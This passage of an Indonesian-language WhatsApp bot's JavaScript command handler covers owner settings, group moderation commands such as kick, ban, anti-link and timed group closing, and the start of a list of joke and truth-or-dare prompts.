{buttonId: `${prefix}settextfitur fitur2`, buttonText: { displayText: `FITUR2`},type: 1},
{buttonId: `${prefix}settextfitur fitur3`, buttonText: { displayText: `FITUR3`},type: 1}],setQuoted);
} else {
setReply("Text Fitur tidak di temukan om")
}
break
case 'setreply':{
if (!isOwner && !itsMe) return onlyOwner()
if ((args[0]) === 'web'|| (args[0]) === 'situs' ){
if(replyType === "web") return setReply("Udah aktif")
replyType = "web"
setReply(`Berhasil mengubah set reply ke ${q}`)
}  else if ((args[0]) === 'web2'|| (args[0]) === 'gc' ){
if(replyType === "web2") return setReply("Udah aktif")
replyType = "web2"
setReply(`Berhasil mengubah set reply ke ${q}`)
}  else if ((args[0]) === 'mess'){
if(replyType === "mess") return setReply("Udah aktif")
replyType = "mess"
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if ((args[0]) === 'troli' ){
if(replyType === "troli") return setReply("Udah aktif")
replyType = "troli"
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if (!q) {
Fan.sendButMessage(from, `SETTING REPLY\n1. web\n2. troli\n3. mess\n4. web2\n5. troli2`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}setreply web`, buttonText: {displayText: `WEB`},type: 1},
{buttonId: `${prefix}setreply web2`, buttonText: {displayText: `WEB2`},type: 1},
{buttonId: `${prefix}setreply mess`, buttonText: { displayText: `MESS`},type: 1}]);
} else {
setReply("Set Reply Tidak Di Temukan")
}
}
break
case 'setbio':   
{
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return setReply(`Kirim perintah ${prefix+command} nama\n\nContoh : ${command} Paijo`)
await Fan.setStatus(q)
await setReply(`Berhasil mengganti status bio ke *${q}*`)
}
break
case 'setgif':{
if (!isOwner && !itsMe) return onlyOwner()
if (isVideo || isQuoteVideo){
let delb = await Fan.downloadAndSaveMediaMessage(quoted)
await fse.copy(delb,`./media/video/video.mp4`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah gif`)
} else {
setReply(`Kirim gambar dengan caption ${prefix}setgif`);
}
}
break
case 'setquoted':
if (!isOwner && !itsMe) return onlyOwner()
if ((args[0]) === 'ftoko'|| (args[0]) === 'product' ){
if(Qoted === "ftoko") return setReply("Udah aktif")
Qoted = "ftoko"
await Fan.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: ftoko})
} else if ((args[0]) === 'fkontak' ){
if(Qoted === "fkontak") return setReply("Udah aktif")
Qoted = "fkontak"
await Fan.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fkontak})
} else if ((args[0]) === 'ftext'){
if(Qoted === "ftext") return setReply("Udah aktif")
Qoted = "ftext"
await Fan.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: ftext})
} else if ((args[0]) === 'ftroli'){
if(Qoted === "ftroli") return setReply("Udah aktif")
Qoted = "ftroli"
await Fan.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: ftroli})
} else if ((args[0]) === 'floc'){
if(Qoted === "floc") return setReply("Udah aktif")
Qoted = "floc"
await Fan.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: floc})
} else if ((args[0]) === 'fimage'){
if(Qoted === "fimage") return setReply("Udah aktif")
Qoted = "fimage"
await Fan.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fimage})
} else if ((args[0]) === 'fdoc' ){
if(Qoted === "fdoc") return setReply("Udah aktif")
Qoted = "fdoc"
await Fan.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fdoc})
} else if ((args[0]) === 'fvid'){
if(Qoted === "fvid") return setReply("Udah aktif")
Qoted = "fvid"
await Fan.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fvid})
} else if ((args[0]) === 'fgc'){
if(Qoted === "fgc") return setReply("Udah aktif")
Qoted = "fgc"
await Fan.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fgc})
} else if ((args[0]) === 'fgif'){
if(Qoted === "fgif") return setReply("Udah aktif")
Qoted = "fgif"
await Fan.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fgif})
}else if ((args[0]) === 'fvn'){
if(Qoted === "fvn") return setReply("Udah aktif")
Qoted = "fvn"
await Fan.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fvn})
} else if ((args[0]) === 'mek'){
if(Qoted === "mek") return setReply("Udah aktif")
Qoted = "mek"
await Fan.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: mek})
} else if (!q) {
Fan.sendButMessage(from, `SETTING QUOTED`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}setquoted ftoko`, buttonText: {displayText: `ғᴛᴏᴋᴏ`},type: 1},
{buttonId: `${prefix}setquoted fkontak`, buttonText: {displayText: `ғᴋᴏɴᴛᴀᴋ`},type: 1},
{buttonId: `${prefix}setquoted ftext`, buttonText: { displayText: `ғᴛᴇxᴛ`},type: 1}],setQuoted);
} else {
let teks =`Quoted yang kamu masukan salah\nSilakan pilih salah satu quoted berikut:\n1.ftoko\n2.fkontak\n3.ftext\n4.ftroli\n5.floc\n6.fimage\n7.fdoc\n8.fvid\n9.fgc\n10.fgif\n11.fvn\n12.mek`
setReply(teks)
}
break
case 'setnamebot':
if (!isOwner && !itsMe) return onlyOwner()
setReply(`Berhasil mengubah nama bot ke ${q}`)
botName = `${q}`
break
case 'setppbot':
if (!isOwner && !itsMe) return onlyOwner()
if (isImage || isQuotedImage) {
var media = await Fan.downloadAndSaveMediaMessage(quoted)
var data =  await Fan.updateProfilePicture(botNumber, { url: media })
fs.unlinkSync(media)
setReply(`Sukses`)
} else {
setReply(`Kirim/balas gambar dengan caption ${command} untuk mengubah foto profil bot`)
}
break
case 'setexif':
if (!isOwner && !itsMe) return onlyOwner()
var namaPack = q.split('|')[0] ? q.split('|')[0] : q
var authorPack = q.split('|')[1] ? q.split('|')[1] : ''
exif.create(namaPack, authorPack)
setReply(`Sukses membuat exif`)
break
case 'setprefix':
{
if (!isOwner && !itsMe) return onlyOwner()
let teks =`SETTING PREFIX\n\nSilakan masukkan prefix\nOptions :\n=> multi\n=> nopref\n=> allpref`
if (q === 'multi'){
multi = true
nopref = false
setReply(`Berhasil mengubah prefix ke *「 ${q} 」*`)
} else if (q === 'nopref'){
multi = false
nopref = true
setReply(`Berhasil mengubah prefix ke *「 ${q} 」*`)
} else if (q === 'allpref'){
multi = false
nopref = false
allpref = true
setReply(`Berhasil mengubah prefix ke *「 ${q} 」*`)
} else if (!q) {
Fan.sendButMessage(from, teks, fake, [
{buttonId: `${prefix}setprefix multi`, buttonText: {displayText: `ᴍᴜʟᴛɪ`},type: 1},
{buttonId: `${prefix}setprefix nopref`, buttonText: {displayText: `ɴᴏᴘʀᴇғ`},type: 1},
{buttonId: `${prefix}setprefix allpref`, buttonText: { displayText: `ᴀʟʟᴘʀᴇғ`},type: 1}]);
} else {
multi = false
nopref = false
prefa = `${q}`
setReply(`Berhasil anying mengubah prefix ke *「 ${q} 」*`)
} 
}
break  
case 'setwelcome':
if (!isOwner && !itsMe) return onlyOwner()
if ((args[0]) === 'type1' ) {
if(setwelcome === "type1") return setReply("Udah aktif")
setwelcome = "type1"
setReply(`Berhasil mengubah welcome ke 「 ${q} 」`)
} else if ((args[0]) === 'type2' ) {
if(setwelcome === "type2") return setReply("Udah aktif")
setwelcome = "type2"
setReply(`Berhasil mengubah welcome ke 「 ${q} 」`)
} else if ((args[0]) === 'type3' ) {
if(setwelcome === "type3") return setReply("Udah aktif")
setwelcome = "type3"
setReply(`Berhasil mengubah welcome ke 「 ${q} 」`)
} else if (!q) {
Fan.sendButMessage(from, `SETTING WELCOME`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}setwelcome type1`, buttonText: {displayText: `Type1`},type: 1},
{buttonId: `${prefix}setwelcome type2`, buttonText: {displayText: `Type2`},type: 1},
{buttonId: `${prefix}setwelcome type3`, buttonText: { displayText: `Type3`},type: 1}],setQuoted);
} else {
let teks =`Query tidak diremukan\nSilakan pilih salah satu:\n1.type1\n2.type2\n3.type3`
setReply(teks)
}
break
case 'setwelcomeintro':
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return reply(`Teks?`)
if ((args[0]) === `${q}` ) {
setintro = `${q}`
setReply(`Berhasil mengubah text intro ke 「 ${q} 」`)
}
break
case 'setwelcomeout':
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return reply(`Teks?`)
if ((args[0]) === `${q}` ) {
setoutro = `${q}`
setReply(`Berhasil mengubah text out ke 「 ${q} 」`)
}
break
case 'setdocument':
case 'setdoc':
if (!isOwner && !itsMe) return onlyOwner()
if ((args[0]) === 'zip' ) {
if(docType === "zip") return setReply("Udah aktif")
docType = "zip"
setReply(`Berhasil mengubah docmunet ke 「 ${q} 」`)
} else if ((args[0]) === 'pdf' ) {
if(docType === "pdf") return setReply("Udah aktif")
docType = "pdf"
setReply(`Berhasil mengubah docmunet ke 「 ${q} 」`)
} else if ((args[0]) === 'pptx' ) {
if(docType === "pptx") return setReply("Udah aktif")
docType = "pptx"
setReply(`Berhasil mengubah docmunet ke 「 ${q} 」`)
} else if ((args[0]) === 'xlsx' ) {
if(docType === "xlsx") return setReply("Udah aktif")
docType = "xlsx"
setReply(`Berhasil mengubah docmunet ke 「 ${q} 」`)
} else if ((args[0]) === 'docx' ) {
if(docType === "docx") return setReply("Udah aktif")
docType = "docx"
setReply(`Berhasil mengubah docmunet ke 「 ${q} 」`)
} else if (!q) {
Fan.sendButMessage(from, `SETTING DOCUMENT`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}setdocument pdf`, buttonText: {displayText: `Pdf`},type: 1},
{buttonId: `${prefix}setdocument xlsx`, buttonText: {displayText: `Xlsx`},type: 1},
{buttonId: `${prefix}setdocument pptx`, buttonText: { displayText: `Pptx`},type: 1}],setQuoted);
} else {
let teks =`Document tidak diremukan\nSilakan pilih salah satu:\n1.zip\n2.pdf\n3.pptx\n4.xlsx\n5.docx`
setReply(teks)
}
break
case 'setfake':
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return reply(`Teks?`)
if ((args[0]) === `${q}` ) {
fake = `${q}`
setReply(`Berhasil mengubah text fake ke 「 ${q} 」`)
}
break
case 'settextreply':
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return reply(`Teks?`)
if ((args[0]) === `${q}` ) {
textreply = `${q}`
setReply(`Berhasil mengubah text reply ke 「 ${q} 」`)
}
break
case 'setnamaowner':
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return reply(`Teks?`)
if ((args[0]) === `${q}` ) {
ownerName = `${q}`
setReply(`Berhasil mengubah nama owner ke 「 ${q} 」`)
}
break
case 'setnamabot':
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return reply(`Teks?`)
if ((args[0]) === `${q}` ) {
botName = `${q}`
setReply(`Berhasil mengubah nama bot ke 「 ${q} 」`)
}
break
case 'setnomerowner':
case 'setnoowner':
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return reply(`Teks?`)
if (args[0].startsWith('08')) return setReply('Gunakan kode negara kak')
if ((args[0]) === `${q}` ) {
nomerOwner = `${q}`
setReply(`Berhasil mengubah nomer owner ke 「 ${q} 」`)
}
break
//━━━━━━━━━━━━━━━[ GRPUP ]━━━━━━━━━━━━━━━━━//
case 'antilinkgc':{
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (isAntilinkGc) return setReply('Fitur sudah aktif kak')
addDataId(from, command, DataId)
let ih =`Fitur antilink group telah di aktifkan`
setReply(ih)
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!isAntilinkGc) return setReply('Udah mati')
removeDataId (command, from, DataId)
let ih =`Fitur antilink group telah di matikan`
setReply(ih)
}else if (!q) {
Fan.sendButMessage(from, `𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐏𝐈𝐋𝐈𝐇 𝐒𝐀𝐋𝐀𝐇 𝐒𝐀𝐓𝐔`, `${fake}`, [
{buttonId: `${prefix}antilinkgc on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}antilinkgc off`, buttonText: { displayText: Off },type: 1}]);
}
}
break;  
case 'antihidetag':{
if (!isGroupAdmins) return setReply(mess.only.admin)
if (!isGroup) return setReply('hanya bisa di group')
if (!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (isAntihidetag) return setReply('Fitur sudah aktif kak')
addDataId(from, command, DataId)
let ih =`Fitur anti hidetag telah di aktifkan`
setReply(ih)
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!isAntihidetag) return setReply('Fitur Anti link sudah off')
removeDataId (command, from, DataId)
let ih =`Fitur anti hidetag telah di matikan`
setReply(ih)
} else if (!q) {
Fan.sendButMessage(from, `𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐏𝐈𝐋𝐈𝐇 𝐒𝐀𝐋𝐀𝐇 𝐒𝐀𝐓𝐔`, `${fake}`, [
{buttonId: `${prefix}antihidetag on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}antihidetag off`, buttonText: { displayText: Off },type: 1}]);
}
}
break
case 'antilink':{
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (isAntiLink) return setReply('Fitur sudah aktif kak')
addDataId(from, command, DataId)
let ih =`Fitur antilink telah di aktifkan`
setReply(ih)
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!isAntiLink) return setReply('Fitur Anti link sudah off')
removeDataId (command, from, DataId)
let ih =`Fitur antilink telah di matikan`
setReply(ih)
} else if (!q) {
Fan.sendButMessage(from, `𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐏𝐈𝐋𝐈𝐇 𝐒𝐀𝐋𝐀𝐇 𝐒𝐀𝐓𝐔`, `${fake}`, [
{buttonId: `${prefix}antilink on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}antilink off`, buttonText: { displayText: Off },type: 1}]);
}
}
break
case 'antivirtex':{
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && isOwner) return onlyAdmin()
if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (isAntiVirtex) return reply('Sudah Aktif')
addDataId(from, command, DataId)
setReply("Sukses mengaktifkan antivirtex!");
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!isAntiVirtex) return reply('Sudah Mati')
removeDataId (command, from, DataId)
setReply("Sukses mematikan antivirtex!");
} else if (!q) {
Fan.sendButMessage(from, `𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐏𝐈𝐋𝐈𝐇 𝐒𝐀𝐋𝐀𝐇 𝐒𝐀𝐓𝐔`, `${fake}`, [
{buttonId: `${prefix}antivirtex on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}antivirtex off`, buttonText: { displayText: Off },type: 1}]);
}
}
break
case 'antiasing':{
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin() 
if (!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (isKickarea) return setReply("Sudah aktif!!");
addDataId(from, command, DataId)
setReply("Sukses mengaktifkan kickarea!");
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!isKickarea) return setReply("Udah off!!");
removeDataId (command, from, DataId)
setReply("Sukses mematikan kickarea!");
} else if (!q) {
Fan.sendButMessage(from, `𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐏𝐈𝐋𝐈𝐇 𝐒𝐀𝐋𝐀𝐇 𝐒𝐀𝐓𝐔`, `${fake}`, 
[{buttonId: `${prefix}kickarea on`, buttonText: { displayText: `on`,},type: 1,},
{buttonId: `${prefix}kickarea off`, buttonText: { displayText: `off`,}, type: 1}, ]);
}
}
break;
case 'infogc': {
let _meta = await Fan.groupMetadata(from)
console.log(_meta)
let _img = await Fan.profilePictureUrl(_meta.id, 'image') 
let caption = `${_meta.subject} - Created on ${moment(_meta.creation * 1000).format('ll')}\n\n` +
`*${_meta.participants.length}* Total Members\n*${_meta.participants.filter(x => x.admin === 'admin').length}* Admin\n*${_meta.participants.filter(x => x.admin === null).length}* Not Admin\n\n` +
`Group ID : ${_meta.id}`
await Fan.sendMessage(from,{
caption,
image: await getBuffer(_img)
},
{ quoted: setQuoted }
)
}
break
case 'linkgc':{
if (!isGroup) return onlyGroup() 
var url = await Fan.groupInviteCode(from).catch(() => setReply(mess.error.api))
let asu = 'https://chat.whatsapp.com/'+url
setReply(asu)
}
break
case 'setppgc':{
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin() 
if (isImage || isQuotedImage) {
let media = await Fan.downloadAndSaveMediaMessage(quoted)
await Fan.updateProfilePicture(from, { url: media })
.then( res => {
setReply(`Sukses`)
fs.unlinkSync(media)
}).catch(() => setReply(mess.error.api))
} else {
setReply(`Kirim/balas gambar dengan caption ${command}`)
}
}
break
case 'setnamegc':
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin() 
if (args.length < 2) return setReply(`Kirim perintah ${command} teks`)
await Fan.groupUpdateSubject(from, q)
.then( res => {
setReply(`Sukses`)
}).catch(() => setReply(mess.error.api))
break
case 'setdesc': 
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin() 
if (args.length < 2) return setReply(`Kirim perintah ${command} teks`)
await Fan.groupUpdateDescription(from, q)
.then( res => {
setReply(`Sukses`)
}).catch(() => setReply(mess.error.api))
break
case 'gc':
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin() 
if (!q) return setReply(`Kirim perintah ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
if (args[0] == "close") {
Fan.groupSettingUpdate(from, 'announcement')
setReply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
} else if (args[0] == "open") {
Fan.groupSettingUpdate(from, 'not_announcement')
setReply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
} else {
setReply(`Kirim perintah ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
}
break
case 'hidetag': case 'h':
if (!isGroup) return onlyGroup() 
// if (!isBotGroupAdmins) return onlyBadmin()
// if (!isGroupAdmins && !isOwner) return onlyAdmin() 
let mem = [];
groupMembers.map( i => mem.push(i.id) )
Fan.sendMessage(from, { text: q ? q : '', mentions: mem })
break
case 'tagall': {
if (!isGroup) return onlyGroup() 
// if (!isBotGroupAdmins) return onlyBadmin()
// if (!isGroupAdmins && !isOwner) return onlyAdmin() 
let teks = `══✪〘 *👥 Tag All* 〙✪══
 
 ➲ *Pesan : ${args.join(" ") ? args.join(" ") : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
Fan.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted: setQuoted })
}
break
case 'revoke':
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin() 
await Fan.groupRevokeInvite(from)
.then( res => {
setReply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => setReply(mess.error.api))
break
case 'kick': {
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin() 
if (!Pe) return setReply("Tag/Mention/Masukan nomer target")
if (Pe.startsWith('08')) return setReply('Awali nomor dengan 62')
await Fan.groupParticipantsUpdate(from, [Pe], 'remove').then((res) => setReply(`Sukses kick ${Pe.split("@")[0]}`)).catch((err) => setReply(jsonformat(err)))
}
break
case 'add': {
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin() 
if (!Pe) return setReply("Tag/Mention/Masukan nomer target")
if (Pe.startsWith('08')) return setReply('Awali nomor dengan 62')
await Fan.groupParticipantsUpdate(from, [Pe], 'add').then((res) => setReply(`Berhasil menambahkan ${Pe.split("@")[0]} ke dalam group ${groupName}`)).catch((err) => setReply(jsonformat(err))) 
}
break
case 'closetime': 
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin() 
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setReply(`Close time ${q} dimulai dari sekarang`)
setTimeout( () => {
var nomor = mek.participant
const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
Fan.groupSettingUpdate(from, 'announcement')
setReply(close)
}, timer)
break				
case 'opentime':        
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin() 
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setReply(`Open time ${q} dimulai dari sekarang`)
setTimeout( () => {
var nomor = mek.participant
const open = `*Tepat waktu* grup dibuka oleh admin\n sekarang member dapat mengirim pesan`
Fan.groupSettingUpdate(from, 'not_announcement')
setReply(open)
}, timer)
break  
case 'demote': case 'member': {
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin() 
if (!Pe) return setReply("Tag/Mention/Masukan nomer target")
if (Pe.startsWith('08')) return setReply('Awali nomor dengan 62')
await Fan.groupParticipantsUpdate(from, [Pe], 'demote').then((res) => setReply(`Sukses Demote ${Pe.split("@")[0]}`)).catch((err) => setReply(jsonformat(err)))
}
break
case 'admin': case 'promote': {
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin() 
if (!Pe) return setReply("Tag/Mention/Masukan nomer target")
if (Pe.startsWith('08')) return setReply('Awali nomor dengan 62')
await Fan.groupParticipantsUpdate(from, [Pe], 'promote').then((res) => setReply(`Sukses Promote ${Pe.split("@")[0]}`)).catch((err) => setReply(jsonformat(err)))
}
break 
case 'kickme':
try{
if (!isGroup) return onlyGroup() 
await Fan.groupParticipantsUpdate(from, [sender], 'remove')
await setReply("Done wkwkw")
} catch (err){
setReply(`${err}`)
}
break
case 'banchat':{
if (!isOwner && !itsMe) return onlyOwner()
if (!isGroup) return onlyGroup() 
if (!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
if (isBanchat) return setReply(`udah di ban`)
addDataId(from, command, DataId)
setReply(`Bot berhasil Ban di group ini`)
}
break
case 'unbanchat':
if (!isOwner && !itsMe) return onlyOwner()
try {
if (!isBanchat) return setReply(`udah di UnBan`)
removeDataId ("banchat", from, DataId)
setReply(`Bot telah di Unban di group ini`)
} catch (err){
console.log(err)
setReply(`${err}`)
}
break
case 'ban':{
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin() 
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (q.startsWith("+")) {
let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") 
let Name = await Fan.getName(woke)
console.log(woke)
if (cekBannedUser (woke, ban)) return setReply("Udah di ban kak")
addBanned(Name,calender,  woke, ban)          
setReply( `Berhasil banned ${woke}`);
} else  if(users){
let Nomer =`${users.split("@")[0]}`
if(cekBannedUser (Nomer, ban)) return setReply("Udah di ban kak")
let Name = await Fan.getName(users)
//if(Nomer === ownerNumber[0]) return setReply("Ga mau")
addBanned(Name,calender,  Nomer, ban)               
setReply(`Berhasil banned ${users.split("@")[0]}`);
} else setReply('Reply atau tag targetnya')
}
break
case 'unban':{
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin() 
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (q.startsWith("+")) {
let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") 
if (!cekBannedUser (woke, ban)) return setReply("Udah di unban kak")
unBanned (woke, ban)             
setReply( `Berhasil unbanned ${woke}`);
} else  if(users){
let Nomer =`${users.split("@")[0]}`
if(!cekBannedUser (Nomer, ban)) return setReply("Udah di unban kak")
//if(Nomer === Ownerin) return setReply("Ga mau")
unBanned (Nomer, ban)             
setReply( `Berhasil unbanned ${users.split("@")[0]}`);
} else setReply('Reply atau tag targetnya')
}
break
case 'getppgc':
if (!isGroup) return onlyGroup() 
onlyWait()
try {
var ppimg = await Fan.profilePictureUrl(from, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await Fan.sendMessage(from, { image: { url: ppimg }}, { quoted: setQuoted })
break 
case 'getpp':
if (isGroup) { 
if (mentionByTag){
console.log(mentionByTag[0])
try {
var ppimg = await Fan.profilePictureUrl(mentionByTag[0],"image")
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await Fan.sendMessage(from, { caption: "Nih", image: { url: ppimg }}, { quoted: setQuoted })
} else if (mentionByReply){
try {
var ppimg = await Fan.profilePictureUrl(mentionByReply, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await Fan.sendMessage(from, { contextInfo: { forwardingScore: 2, isForwarded: true },caption: "Nih", image: { url: ppimg }}, { quoted: setQuoted })
} 
} else if(!isGroup){
try {
var ppimg = await Fan.profilePictureUrl(from, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await Fan.sendMessage(from, {caption: "Nih",  image: { url: ppimg }}, { quoted: setQuoted })
}
break
case 'listonline': {
if (!isGroup) return onlyGroup() 
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(store.presences[id]), botNumber]
Fan.sendText(from, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, setQuoted, { mentions: online })
}
break
case 'getname':
if(isGroup) {
console.log(users)
const sname = await Fan.getName(users)
setReply(sname)
} else if(!isGroup) {
const yahu = await Fan.getName(users)
setReply(yahu)
} else{
setReply("Reply targetnya")
}
break
//━━━━━━━━━━━━━━━[ FUN ]━━━━━━━━━━━━━━━━━//
case 'cekbapak':
const bapak = ['Wah Mantap Lu Masih Punya Bapack\nPasti Bapack Nya Kuli :v\nAwowkwokwwok\n#CandabOs', 'Aowkwwo Disini Ada Yteam :v\nLu Yteam Bro? Awowkwowk\nSabar Bro Ga Punya Bapack\n#Camda', 'Bjir Bapack Mu Ternyata Sudah Cemrai\nSedih Bro Gua Liatnya\nTapi Nih Tapi :v\nTetep Ae Lu Yteam Aowkwowkw Ngakak :v', 'Jangan #cekbapak Mulu Broo :v\nKasian Yang Yteam\nNtar Tersinggung Kan\nYahahaha Hayyuk By : Ramlan ID']
const cek = bapak[Math.floor(Math.random() * bapak.length)]
setReply(cek)
break
case 'truth':
const trut = ['Pernah suka sama siapa aja? berapa lama?', 'Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)', 'apa ketakutan terbesar kamu?', 'pernah suka sama orang dan merasa orang itu suka sama kamu juga?', 'Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?', 'pernah gak nyuri uang nyokap atau bokap? Alesanya?', 'hal yang bikin seneng pas lu lagi sedih apa', 'pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?', 'pernah jadi selingkuhan orang?', 'hal yang paling ditakutin', 'siapa orang yang paling berpengaruh kepada kehidupanmu', 'hal membanggakan apa yang kamu dapatkan di tahun ini', 'siapa orang yang bisa membuatmu sange', 'siapa orang yang pernah buatmu sange', '(bgi yg muslim) pernah ga solat seharian?', 'Siapa yang paling mendekati tipe pasangan idealmu di sini', 